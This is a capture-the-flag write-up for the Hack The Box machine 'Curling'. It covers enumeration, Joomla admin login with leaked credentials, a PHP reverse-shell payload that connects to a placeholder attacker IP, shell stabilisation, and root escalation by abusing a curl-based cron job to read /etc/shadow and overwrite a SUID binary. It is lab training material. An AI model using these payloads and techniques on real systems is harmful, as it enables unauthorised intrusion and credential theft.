## Information

- OS: Linux
- Difficulty: Easy
- IP address: 10.10.10.150

## Enumeration

### Ports and services

Enumerate all the target's machine open ports with nmap

`nmap -sS -p- --open --min-rate=5000 -v -n -Pn 10.10.10.150 -oG openPorts`
![](/assets/img/HTB/Curling/Pasted image 20240624203554.png)

The machine has ports 22 and 80 open. Lets scan the services running on them

`sudo nmap -sCV -p22,80 -v -n -Pn 10.10.10.150 -oN services`
![](/assets/img/HTB/Curling/Pasted image 20240624203654.png)

The port 22 is running OpenSSH 7.6 and port 80 is running an Apache http server

### HTTP server

Navigating to *http://10.10.10.150* the servers show a home page with some articles and a login form
![](/assets/img/HTB/Curling/Pasted image 20240624203841.png)
One of the articles, 'My first post of curling in 2018!' contains a possible username for the system: 
Floris

Visiting an article show us a button on the right a engine button which allow to print the article
*http://10.10.10.150/index.php/2-uncategorised/2-curling-you-know-its-true*

![](/assets/img/HTB/Curling/Pasted image 20240624204435.png)

![](/assets/img/HTB/Curling/Pasted image 20240624204444.png)

![](/assets/img/HTB/Curling/Pasted image 20240624204517.png)

Wappalyzer reveals that server's CMS is Joomla

![](/assets/img/HTB/Curling/Pasted image 20240624204649.png)

Fuzzing the page reveals some directories and files:

![](/assets/img/HTB/Curling/Pasted image 20240624210515.png)

'administrator', the Joomla login page

*http://10.10.10.150/administrator*
![](/assets/img/HTB/Curling/Pasted image 20240624205639.png)

'README.txt', which reveals that Joomla's version is 3.8

*http://10.10.10.150/README.txt*
![](/assets/img/HTB/Curling/Pasted image 20240624210725.png)

And 'secret.txt', just showing a string

*http://10.10.10.150/secret.txt*

![](/assets/img/HTB/Curling/Pasted image 20240624210844.png)

If we decode it as a base64 string we get Curling2018!%

![](/assets/img/HTB/Curling/Pasted image 20240624210945.png)

Last '%' char appears if the decoded string does not end with a newline. Lets check it with other tool

![](/assets/img/HTB/Curling/Pasted image 20240624212341.png)

So, decoded string is Curling2018!

Try to log into the 'administrator' page with this string and the possible user previously found
user: floris
password: Curling2018!

![](/assets/img/HTB/Curling/Pasted image 20240624212520.png)

And we are logged in the Joomla's control panel

![](/assets/img/HTB/Curling/Pasted image 20240624214105.png)

## Shell as www-data

Being in the control panel we can modify a template to inject a php payload to send us a reverse shell

![](/assets/img/HTB/Curling/Pasted image 20240624214137.png)

'Protostar' is the default template in this project, so the payload will be added to it

![](/assets/img/HTB/Curling/Pasted image 20240624214151.png)

Add  `$sock=fsockopen("YOUR_IP",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);` to index.php

![](/assets/img/HTB/Curling/Pasted image 20240624215222.png)

Open a listener in the attacker machine on port 4242

![](/assets/img/HTB/Curling/Pasted image 20240624215323.png)

Then, go to *http://10.10.10.150*

![](/assets/img/HTB/Curling/Pasted image 20240624215333.png)
And our netcat will receive a shell

To upgrade and stabilize the shell use `python3 -c 'import pty;pty.spawn("/bin/bash");'`, *CTRL + Z*, `stty raw -echo; fg` and `export TERM=xterm`

![](/assets/img/HTB/Curling/Pasted image 20240624215908.png)


## Shell as floris

In target machine, we are www-data, we don't belong to any special group and the kernel version is 4.15.0 

![](/assets/img/HTB/Curling/Pasted image 20240624220151.png)

Listing '/home/floris' directory we found a 'password_backup' file with read permissions on all users

![](/assets/img/HTB/Curling/Pasted image 20240624220502.png)

Contents file is encrypted. Searching on google we find that the 'BZh' in the first line right means that this is a bz2 file

![](/assets/img/HTB/Curling/Pasted image 20240624225244.png)

Transfer the file to attacker's machine to work with it
Firstly, transform file from ASCII to binary with xxd

`cat password_backup | xxd -r > password_backup2`
![](/assets/img/HTB/Curling/Pasted image 20240624232513.png)

Decrypt file with bzip2

`bzip2 -d password_backup.bz2`
![](/assets/img/HTB/Curling/Pasted image 20240624232524.png)

Result file is a gzip file. Decrypt it with gzip

`gzip -d password_backup.gz`
![](/assets/img/HTB/Curling/Pasted image 20240624232537.png)

Again, the result file is a bzip2. Decrypt it again

`bzip2 -d password_backup.bz2`
![](/assets/img/HTB/Curling/Pasted image 20240624232548.png)

And now the decrypted file is a tar archive

`tar xf password_backup`

![](/assets/img/HTB/Curling/Pasted image 20240624232605.png)

Now, the final file is a txt, read it

![](/assets/img/HTB/Curling/Pasted image 20240624232610.png)

File's content is `5d<wdCbdZu)|hChXll`

This is the password for floris account
![](/assets/img/HTB/Curling/Pasted image 20240624232655.png)

## Shell as root

### Enumerating floris user

As floris, now we can access to 'admin-area'

![](/assets/img/HTB/Curling/Pasted image 20240624232852.png)

There are 2 files: input and report

![](/assets/img/HTB/Curling/Pasted image 20240624235025.png)

`input`

![](/assets/img/HTB/Curling/Pasted image 20240624235033.png){: left }

`report`

![](/assets/img/HTB/Curling/Pasted image 20240624235042.png){: left }

We can notice that `report` is the source page from index.php from the HTTP server, which can be accessed via *http://127.0.0.1* from this machine

Modify the `input` to target a private file 

![](/assets/img/HTB/Curling/Pasted image 20240624235125.png){: left }

After a while, `report` shows the `/etc/shadow` content

![](/assets/img/HTB/Curling/Pasted image 20240624235232.png)

So, root is running a recurrent task to copy a specified file in `input` into `report`
Watching `/etc/crontab` doesn't reveal any relevant task

![](/assets/img/HTB/Curling/Pasted image 20240625004152.png)

Lets use [pspy](https://github.com/DominicBreuker/pspy) to enumerate all recurrent processes running in the machine. Download it from attacker's machine and transfer it to victim's one

![](/assets/img/HTB/Curling/Pasted image 20240625003957.png)

![](/assets/img/HTB/Curling/Pasted image 20240625003847.png)

![](/assets/img/HTB/Curling/Pasted image 20240625003943.png)

It shows one rare task: `curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report`

![](/assets/img/HTB/Curling/Pasted image 20240625004130.png)

Curl is the tool used to get files content and putting them into `report` 
Reading curl's manual show's how to use the -K parameter. It is used to specify a parameters file like `url`
Additionally, it can contents a output value

`man curl`
![](/assets/img/HTB/Curling/Pasted image 20240625011718.png)

![](/assets/img/HTB/Curling/Pasted image 20240625011838.png)

![](/assets/img/HTB/Curling/Pasted image 20240625012004.png)

It works

### Exploiting the recurrent task

To escalate privileges we can use this task to copy the content of `/bin/bash` into a binary with SUID permissions 
Enumerate the SUID binaries

`find / -perm -4000 2>/dev/null`
![](/assets/img/HTB/Curling/Pasted image 20240625012104.png)

Lets use `/bin/ping`, modify the `report` file to adding `/bin/bash` as url and `/bin/ping` as output

![](/assets/img/HTB/Curling/Pasted image 20240625015716.png)

And finally, after a while execute the ping binary with `-p` parameter to execute a root shell
